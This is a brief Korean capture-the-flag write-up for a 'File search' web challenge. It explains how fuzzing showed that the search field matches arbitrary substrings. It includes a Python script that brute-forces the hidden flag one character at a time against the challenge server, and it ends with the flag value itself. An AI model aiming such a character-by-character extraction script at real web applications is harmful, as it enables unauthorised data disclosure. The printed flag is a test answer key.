# [hackburger] File search - Writeup

파일을 검색할 수 있는 웹페이지가 있다.

input: `a`
```
cat.txt
flag.txt
```

___

## Fuzzing

Fuzzing을 해보다가 파일명 이외의 문자를 입력해도 결과가 나온다는걸 알았다.

이를 기반으로 `flag.txt`가 결과로 나오는 문자열을 찾아보니 flag가 나온다.

``` python
import urllib.parse, urllib.request
import binascii

def get_table():
	pw = ''
	for c in range(0, 128):
		if inject(chr(c)):
			pw += chr(c)
			print('find:', pw)
	print('find:', pw)

def inject(c):
	url = 'http://burger.laboratorium.ee:8004/'
	post_data = {
		'query':c
	}
	headers = {
		'Content-Type':'application/x-www-form-urlencoded'
	}
	req = urllib.request.Request(url, urllib.parse.urlencode(post_data).encode(), headers)
	res = urllib.request.urlopen(req).read().decode()

	if 'flag.txt' in res:
		return True
	else:
		return False

def main():
	pw = ''
	while True:
		is_find = False
		for c in '_0123456789ACDEFGHILSTX.':
			if inject(pw + c):
				pw += c
				print('find:', pw)
				is_find = True
				break
			print('try:', pw + c)
		if is_find == False:
			print('data:', pw)
			break

if __name__ == '__main__':
	main()
```

___

## Answer

flag: `c82584c307421228a3c5c5e4dc6a3ea31859975e`